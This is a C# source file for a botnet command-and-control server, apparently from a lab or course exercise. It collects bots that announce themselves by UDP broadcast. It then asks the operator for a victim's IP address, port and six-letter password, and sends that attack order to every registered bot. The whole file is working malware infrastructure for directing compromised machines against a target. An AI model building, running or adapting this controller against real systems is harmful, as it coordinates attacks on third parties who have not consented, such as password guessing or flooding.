using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace cNc
{
    class CNCServer
    {
        private static object MessageLock = new object(); /* Used for coloring the text */
        private string _ipTarget;
        private readonly int _iUdpPortNumber;
        private string _portTarget;
        private string _passwordTarget;
        private UdpClient _udpClient;
        private byte[] _bufferBytes = new byte[44];
        private Thread thread;
        private readonly string _szCNCServerName;
        private List<Bot> _botList;
        private string _matchPasswordPattern = "([a-z]){6}";

        #region Constatns

        private const string szUploadMessagePrefix = "Command and control server ";
        private const string szUploadMessageSuffix = " active";
        #endregion
        public CNCServer(int iUdpPortNumberIn, string szCNCServerNameForNetwork, string szCNCServerNameForConsoleTitle = null)
        {
            /* Sets the CNCServer name */
            _szCNCServerName = szCNCServerNameForNetwork;
            Console.Title = szCNCServerNameForConsoleTitle ?? szCNCServerNameForNetwork;

            /* Animated Console Title */
            Thread animatedConsoleTitle = new Thread(AnimateConsoleTitle) { Name = "animatedConsoleTitleThread" };
            animatedConsoleTitle.Start();

            /* Set console text color */
            Console.ForegroundColor = ConsoleColor.Cyan;

            /* Intitialize the data stracture holding the bots */
            _botList = new List<Bot>();

            /* UDP port to listen */
            _iUdpPortNumber = iUdpPortNumberIn;

            /* Print listening message to screen */
            ConsoleWriteColoredMessage(GetCNCServerStartMessage(), ConsoleColor.Cyan);

        }

        private string GetCNCServerStartMessage()
        {
            return szUploadMessagePrefix + _szCNCServerName + szUploadMessageSuffix;
        }

        public void ConsoleWriteColoredMessage(string message, ConsoleColor color)
        {
            lock (MessageLock)
            {
                Console.ForegroundColor = color;
                Console.WriteLine(message);
            }
        }
        private static void AnimateConsoleTitle()
        {
            string szPartialTitle = "";
            string szConsoleTitle = Console.Title;
            while (true)
            {
                foreach (char cChar in szConsoleTitle)
                {
                    szPartialTitle += cChar;
                    Console.Title = szPartialTitle;
                    Thread.Sleep(150);
                }
                Thread.Sleep(8000);
                szPartialTitle = "";
            }
        }
        public void Start()
        {
            ThreadStart threadDelegate = new ThreadStart(() => ListenForBroadcast());
            thread = new Thread(threadDelegate);
            thread.Start();


            while (true)
            {
                /* Get the target info*/
                GetVictimConnectionInfo();

                /*print attcking target*/
                Console.WriteLine("attacking victim on IP " + _ipTarget + ", port " + _portTarget + " with " + _botList.Count + " bots");

                SendMessgeToAllBotsViaUDP();
            }
        }
        public void ListenForBroadcast()
        {
            while (true)
            {
                /* Initialiize an UDP client */
                InitializeUdpClient(_iUdpPortNumber);

                IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Broadcast, _iUdpPortNumber);

                try
                {
                    /* Listen for broadcast */
                    byte[] receiveBytes = _udpClient.Receive(ref remoteEndPoint);

                    /* Extract the data of the bot from the broadcast it sent */
                    int iBotPort = ExtractPort(ref receiveBytes);

                    /* Create new bot candidate */
                    Bot newIncomingBot = new Bot(iBotPort, remoteEndPoint);

                    /* Add the bot to the data stracture */
                    if (0 <= iBotPort && !IsBotInBotList(newIncomingBot))
                    {
                        _botList.Add(newIncomingBot);
                    }
                }
                catch (Exception)
                {
                    _udpClient?.Close();
                    ListenForBroadcast();
                }
                _udpClient?.Close();
            }
        }

        private bool IsBotInBotList(Bot otherBot)
        {
            foreach (Bot bot in _botList)
            {
                if (otherBot.Equals(bot))
                {
                    return true;
                }
            }
            return false;
        }


        private void InitializeUdpClient(int iListenPort)
        {
            _udpClient = new UdpClient { ExclusiveAddressUse = false };
            _udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            _udpClient.Client.Bind(new IPEndPoint(IPAddress.Any, iListenPort));
        }

        private void SendMessgeToAllBotsViaUDP()
        {
            List<Bot> copiedBotList = new List<Bot>(_botList);

            foreach (Bot bot in copiedBotList)
            {
                UdpClient client = new UdpClient(AddressFamily.InterNetwork) { DontFragment = true };
                //Console.WriteLine("startig messege for bot " + bot.ToString());

                /* Combine all the data to single array */
                byte[] messageToSend = SendMessageToBot();

                /* Send the broadcast */
                try
                {
                    client.Send(messageToSend, messageToSend.Length, new IPEndPoint(bot.botIpEndpoint.Address, bot.iBotListenPort));

                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
                finally
                {
                    /* Close the socket */
                    client.Close();
                }
            }
        }

        private static string CompleteStringToNumberOfChars(string szStr, int iNumOfChars = 32, char cToAdd = ' ')
        {
            int iCharsLeftToAdd = iNumOfChars - szStr.Length;

            if (0 < iCharsLeftToAdd)
            {
                szStr = AddChars(szStr, iCharsLeftToAdd, cToAdd);
            }

            if (0 > iCharsLeftToAdd)
            {
                throw new IndexOutOfRangeException("Given name is too long");
            }

            return szStr;
        }

        private static string AddChars(string szStr, int iNumOfCharsToAdd, char cToAdd)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append(szStr);

            for (int i = 0; i < iNumOfCharsToAdd; i++)
            {
                sb.Append(cToAdd);
            }

            return sb.ToString();
        }
        private byte[] SendMessageToBot()
        {
            byte[] bytePort = IntToBinaryStr(int.Parse(_portTarget));
            byte[] byteIp = StringIp(_ipTarget);
            byte[] bytePassword = Encoding.ASCII.GetBytes(_passwordTarget);
            byte[] byteCncName = Encoding.ASCII.GetBytes(CompleteStringToNumberOfChars(_szCNCServerName));
            byte[] concatedByteArrays = new byte[44];

            /* Pointer for byte array */
            int iCounter = 0;

            /* Add the ip address */
            Buffer.BlockCopy(byteIp, 0, concatedByteArrays, iCounter, byteIp.Length);
            iCounter += byteIp.Length;

            /* Add the port */
            Buffer.BlockCopy(bytePort, 0, concatedByteArrays, iCounter, bytePort.Length);
            iCounter += bytePort.Length;

            /* Add the password */
            Buffer.BlockCopy(bytePassword, 0, concatedByteArrays, iCounter, bytePassword.Length);
            iCounter += bytePassword.Length;

            /* Add the name of the server */
            Buffer.BlockCopy(byteCncName, 0, concatedByteArrays, iCounter, byteCncName.Length);

            return concatedByteArrays;
        }

        private static int ExtractPort(ref byte[] receiveBytes)
        {
            byte[] botPortBytes = { receiveBytes[receiveBytes.Length - 2], receiveBytes[receiveBytes.Length - 1] };
            if (BitConverter.IsLittleEndian)
                Array.Reverse(botPortBytes);
            return BitConverter.ToUInt16(botPortBytes, 0);
        }

        private void GetVictimConnectionInfo()
        {
            /* Validate the user ip address input */
            while (!ValidateUserIp()) ;

            /* Validate the user port input */
            while (!ValidateUserPort()) ;

            /* Validate the user password input */
            while (!ValidateUserPassword()) ;
        }

        private bool ValidateUserIp()
        {
            Console.Write("Please enter your target ip: \n> ");
            _ipTarget = Console.ReadLine();
            IPAddress ip;
            return IPAddress.TryParse(_ipTarget, out ip);
        }

        private bool ValidateUserPort()
        {
            Console.Write("Please enter your target port: \n> ");
            _portTarget = Console.ReadLine();
            int iParsedPort;
            if (int.TryParse(_portTarget, out iParsedPort))
            {
                return 0 <= iParsedPort;
            }
            return false;
        }

        private bool ValidateUserPassword()
        {
            Console.Write("Please enter your target password: \n> ");
            _passwordTarget = Console.ReadLine();
            if (6 != _passwordTarget.Length)
            {
                return false;
            }
            return Regex.IsMatch(_passwordTarget, _matchPasswordPattern);
        }

        private static byte[] IntToBinaryStr(int iNumber)
        {
            byte[] intBytes = BitConverter.GetBytes(iNumber);
            if (!BitConverter.IsLittleEndian) return intBytes;
            intBytes = new[] { (byte)(iNumber >> 8), (byte)iNumber };
            return intBytes;
        }
        private byte[] StringIp(string ip)
        {
            IPAddress adress = IPAddress.Parse(ip);
            return adress.GetAddressBytes();
        }
    }
}
